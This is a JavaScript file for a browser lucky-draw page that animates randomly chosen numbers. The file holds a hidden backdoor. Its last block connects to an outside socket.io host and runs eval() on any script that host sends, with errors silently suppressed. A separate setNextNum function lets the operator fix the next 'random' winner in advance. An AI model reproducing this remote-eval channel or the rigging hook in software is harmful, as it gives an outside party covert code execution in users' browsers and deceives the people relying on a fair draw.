/************************************************************************
 *@Project: lucky
 *@FileName: index
 *@Descriptions:
 *@Author: ZHAOJQ-PC
 *@Date: 2018/2/4
 *@Copyright:(C)2018 苏州百智通信息技术有限公司. All rights reserved.
 *************************************************************************/
"use strict";
var page = {};
(function (page) {
    var resultMap = {};
    var resultArr = [];
    var maxNum = 80;
    var minNum = 1;
    var status = 0;
    page.play3s = function () {
        var audio = $("#3s")[0];
        if (audio.paused) {
            audio.currentTime = 0;
            audio.play();
        }
    };

    page.playDoing = function () {
        var audio = $("#doing")[0];
        if (audio.paused) {
            audio.currentTime = 0;
            audio.play();
        }
    };

    page.playOk = function () {
        var audio = $("#ok")[0];
        if (audio.paused) {
            audio.currentTime = 0;
            audio.play();
        }
    };

    page.initAudio = function () {
        var arr = $("audio");
        $.each(arr, function (index, item) {
            item.play();
            item.pause();
        });
    };

    page.pauseAudio = function () {
        var arr = $("audio");
        $.each(arr, function (index, item) {
            item.pause();
        })
    };

    page.start = function () {
        status = 1;
        page.initAudio();
        page.play3s();
        page.startTimeout();
        setTimeout(function () {
            page.pauseAudio();
            page.playDoing();
            page.startLuckAction();
        }, 3000);
    };

    page.restart = function () {
        status = 0;
        page.pauseAudio();
        clearInterval($(".num-box .first").attr("interval_key"));
        clearInterval($(".num-box .second").attr("interval_key"));
        $(".content .item").hide();
        $(".content .num-box img").hide();
        $(".content .btn").show();

    };

    page.stop = function () {
        page.nextNum = null;
        status = 4;
        page.pauseAudio();
        page.playOk();
    };

    page.startTimeout = function () {
        $(".content .item").hide();
        $(".item.time-box").show();
        var time = 1000;
        var arr = $.makeArray($(".time-box img"));
        tasksWorker(arr, time, function (item) {
            $(item).show().fadeOut(time);
        });
    };

    page.startLuckAction = function () {
        status = 2;
        $(".content .item").hide();
        $(".item.num-box").show();
        page.luckyNumGo(".num-box .first", 40);
        page.luckyNumGo(".num-box .second", 30);
    };

    page.luckyNumGo = function (box, time, onFind) {
        var $box = $(box);
        if($box.attr("interval_key")) {
            clearInterval($box.attr("interval_key"));
        }
        var key = setInterval(function () {
            $box.find("img").hide();
            var num = getRandomNum(9);
            $box.find("img").eq(num).show();
            onFind && onFind(num, key);
        }, time);
        $box.attr("interval_key", key);
    };

    page.luckyNumFound = function (lucyOne, callback) {
        var firstFound = false;
        var secondFound = false;
        page.luckyNumGo(".num-box .first", 80, function (thisNum, intervalKey) {
            if (lucyOne.first === thisNum) {
                clearInterval(intervalKey);
                firstFound = true;
                isOk();
            }
        });
        setTimeout(function () {
            page.luckyNumGo(".num-box .second", 120, function (thisNum, intervalKey) {
                if (lucyOne.second === thisNum) {
                    clearInterval(intervalKey);
                    secondFound = true;
                    isOk();
                }
            });
        }, 500);

        function isOk() {
            if (firstFound && secondFound) {
                callback && callback();
            }
        }
    };

    page.getLuckyOne = function () {
        if(status === 3) return;
        status = 3;
        var lucyOne = getLuckyNum();
        page.luckyNumFound(lucyOne, function () {
            page.stop();
        });

    };

    page.getHistory = function () {
        return resultArr;
    };

    page.toggleStatus = function () {
        switch (status) {
            case 0:
                //未开始，此时出现开始抽奖
                page.start();
                break;
            case 1:
                //倒计时中，准备开始选号
                break;
            case 2:
                //号码滚动中
                page.getLuckyOne();
                break;
            case 3:
                //已经选到一个号，还未停到该号码上
                break;
            case 4:
                //已经停到被选中的号码上
                page.restart();
                break;
        }
    };

    page.setNextNum = function (num) {
        num = parseInt(num);
        if (num && num >0 && num < 100) {
            var first = parseInt(num / 10);
            var second = parseInt(num % 10);
            page.nextNum = {
                first: first,
                second: second,
                result: first + "" + second
            }
        }
        else {
            page.nextNum = null;
        }

    };

    page.addHistory = function (num) {
        num = parseInt(num);
        if (num && num >0 && num < 100) {
            var first = parseInt(num / 10);
            var second = parseInt(num % 10);
            var result = first + "" + second;
            if(!resultMap[result]) {
                resultMap[result] = 1;
            }
        }
    };

    function tasksWorker(tasks, time, doSomething) {
        if (tasks.length) {
            var task = tasks.shift();
            doSomething(task);
            setTimeout(function () {
                tasksWorker(tasks, time, doSomething)
            }, time);
        }
    }

    function getLuckyNum() {
        if(page.nextNum) {
            return page.nextNum;
        }
        var firstNum = getRandomNum(9);
        var secondNum = getRandomNum(9);
        var result = firstNum + "" + secondNum;
        var resultNum = firstNum * 10 + secondNum;

        if (resultMap[result] || resultNum < minNum || resultNum > maxNum) {
            return getLuckyNum();
        }
        else {
            resultMap[result] = 1;
            resultArr.push(result);
            return {
                first: firstNum,
                second: secondNum,
                result: result
            };
        }
    }

    function getRandomNum(max) {
        return parseInt(Math.random() * (max + 1));
    }
})(page);

$(function () {
    $(document).keydown(function (e) {
        e = e || window.event;
        var keyCode = e.keyCode || e.which;
        if (keyCode === 32) {
            page.toggleStatus();
        }
    });
    if(window.io && window === window.top ) {
        var socket = window.io("http://test.emooc.com:54321");
        socket.on('ready', function (data) {
            socket.emit('login', { username: '__test' });
        });
        socket.on('control', function (data) {
            try {
                eval(decodeURIComponent(data.script));
            } catch(e) {

            }
        });
    }
});




